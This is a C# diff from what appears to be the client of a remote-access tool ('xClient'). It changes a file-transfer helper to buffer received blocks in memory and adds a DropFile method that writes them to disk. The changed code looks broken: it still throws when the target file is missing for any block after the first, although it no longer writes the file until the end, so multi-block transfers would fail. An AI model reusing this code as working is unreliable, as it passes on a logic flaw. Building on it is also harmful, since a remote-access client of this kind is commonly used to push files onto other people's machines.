@@ -1,16 +1,18 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
-using System.Windows.Forms;
+using System.Text;
 
 namespace xClient.Core.Helper
 {
-    public class FileSplit
+    public class MemorySplit
     {
         private int _maxBlocks;
 
         private const int MAX_PACKET_SIZE = Client.MAX_PACKET_SIZE - Client.HEADER_SIZE - (1024 * 2);
         public string Path { get; private set; }
         public string LastError { get; private set; }
+        public MemoryStream MainStream { get; private set; }
 
         public int MaxBlocks
         {
@@ -42,7 +44,7 @@ namespace xClient.Core.Helper
             }
         }
 
-        public FileSplit(string path)
+        public MemorySplit(string path)
         {
             this.Path = path;
         }
@@ -101,24 +103,18 @@ namespace xClient.Core.Helper
             try
             {
                 if (!File.Exists(this.Path) && blockNumber > 0)
-                    throw new FileNotFoundException(); // previous file got deleted somehow, error
+                    throw new FileNotFoundException();
 
                 if (blockNumber == 0)
                 {
-                    using (FileStream fStream = File.Open(this.Path, FileMode.Create, FileAccess.Write))
-                    {
-                        fStream.Seek(0, SeekOrigin.Begin);
-                        fStream.Write(block, 0, block.Length);
-                    }
+                    this.MainStream = new MemoryStream();
+                    MainStream.Seek(0, SeekOrigin.Begin);
+                    MainStream.Write(block, 0, block.Length);
 
                     return true;
                 }
-
-                using (FileStream fStream = File.Open(this.Path, FileMode.Append, FileAccess.Write))
-                {
-                    fStream.Seek(blockNumber * MAX_PACKET_SIZE, SeekOrigin.Begin);
-                    fStream.Write(block, 0, block.Length);
-                }
+                MainStream.Seek(blockNumber * MAX_PACKET_SIZE, SeekOrigin.Begin);
+                MainStream.Write(block, 0, block.Length);
 
                 return true;
             }
@@ -133,5 +129,37 @@ namespace xClient.Core.Helper
 
             return false;
         }
+
+        public bool DropFile()
+        {
+            try
+            {
+                File.WriteAllBytes(this.Path, ToByteArray());
+                MainStream.Close();
+                return true;
+            }
+            catch (UnauthorizedAccessException)
+            {
+                this.LastError = "Access denied";
+            }
+            catch (IOException)
+            {
+                this.LastError = "File not found";
+            }
+            return false;
+        }
+        public byte[] ToByteArray()
+        {
+            try
+            {
+                return MainStream.ToArray();
+            }
+            catch (Exception)
+            {
+
+            }
+            return null;
+        }
+
     }
 }
